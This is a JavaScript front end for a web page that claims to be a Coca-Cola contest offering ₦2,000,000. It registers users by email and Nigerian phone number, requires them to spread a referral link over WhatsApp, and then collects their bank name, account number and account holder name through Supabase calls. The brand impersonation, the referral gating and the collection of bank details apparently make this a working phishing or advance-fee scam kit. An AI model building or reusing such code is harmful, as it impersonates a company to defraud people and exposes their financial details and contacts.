// ====== CONFIG: replace with your Supabase values (anon key only) ======
const SUPABASE_URL = "YOUR_PROJECT_URL";
const SUPABASE_ANON_KEY = "YOUR_ANON_KEY";
// =======================================================================

const sb = supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
const $ = id => document.getElementById(id);

// Banner fallback if image is missing
$("bannerImg").onerror = function () {
  const s = document.createElement("span");
  s.textContent = "Coca-Cola";
  this.replaceWith(s);
};

const BANKS = ["Access Bank","Citibank Nigeria","Ecobank Nigeria","Fidelity Bank","First Bank of Nigeria","First City Monument Bank (FCMB)","Globus Bank","Guaranty Trust Bank (GTBank)","Heritage Bank","Keystone Bank","Kuda Microfinance Bank","Moniepoint MFB","OPay","PalmPay","Polaris Bank","Providus Bank","Stanbic IBTC Bank","Standard Chartered Bank","Sterling Bank","SunTrust Bank","Titan Trust Bank","Union Bank","United Bank for Africa (UBA)","Unity Bank","Wema Bank","Zenith Bank"];
BANKS.forEach(b => $("bank").add(new Option(b, b)));

const ref = (new URLSearchParams(location.search).get("ref") || "").toUpperCase();
let user = JSON.parse(localStorage.getItem("promoUser") || "null");

function normPhone(p) {
  p = (p || "").replace(/[\s-]/g, "");
  if (!/^(\+234|234|0)[789][01]\d{8}$/.test(p)) return null;
  return "0" + p.slice(-10);
}

async function rpc(fn, args) {
  const { data, error } = await sb.rpc(fn, args);
  if (error) throw new Error(error.message);
  return data;
}

function save() {
  localStorage.setItem("promoUser", JSON.stringify(user));
  render();
}

function render() {
  if (!user) return;
  $("s1").classList.add("hidden");
  $("s2").classList.remove("locked");
  $("codeBox").textContent = user.code;
  $("refCount").textContent = Math.min(user.referrals, user.required);
  $("barFill").style.width = Math.min(100, user.referrals / user.required * 100) + "%";
  $("s3").classList.toggle("locked", !user.unlocked);
  if (user.submitted) {
    $("s2").classList.add("hidden");
    $("s3").classList.add("hidden");
    $("done").classList.remove("hidden");
  }
}

$("regBtn").onclick = async () => {
  $("regMsg").textContent = "";
  const phone = normPhone($("phone").value);
  if (!phone) { $("regMsg").textContent = "Enter a valid Nigerian phone number."; return; }
  $("regBtn").disabled = true;
  try {
    user = await rpc("register_user", { p_email: $("email").value, p_phone: phone, p_ref: ref || null });
    save();
  } catch (e) { $("regMsg").textContent = e.message; }
  $("regBtn").disabled = false;
};

async function refresh() {
  if (!user) return;
  try {
    user = await rpc("get_status", { p_email: user.email, p_phone: user.phone });
    save();
  } catch (e) {}
}
$("refresh").onclick = refresh;
setInterval(refresh, 20000);

const link = () => `${location.origin}${location.pathname}?ref=${user.code}`;
const shareText = () => `Join the Coca-Cola video & voting contest and win ₦2,000,000! Register here: ${link()}`;
$("copyCode").onclick = () => navigator.clipboard.writeText(user.code);
$("copyLink").onclick = () => navigator.clipboard.writeText(link());
$("waBtn").onclick = () => window.open("https://wa.me/?text=" + encodeURIComponent(shareText()), "_blank");

$("submitBtn").onclick = async () => {
  $("bankMsg").textContent = "";
  $("submitBtn").disabled = true;
  try {
    user = await rpc("submit_bank", {
      p_email: user.email, p_phone: user.phone,
      p_bank: $("bank").value, p_acct: $("acct").value, p_name: $("acctName").value
    });
    save();
  } catch (e) { $("bankMsg").textContent = e.message; }
  $("submitBtn").disabled = false;
};

render();
refresh();
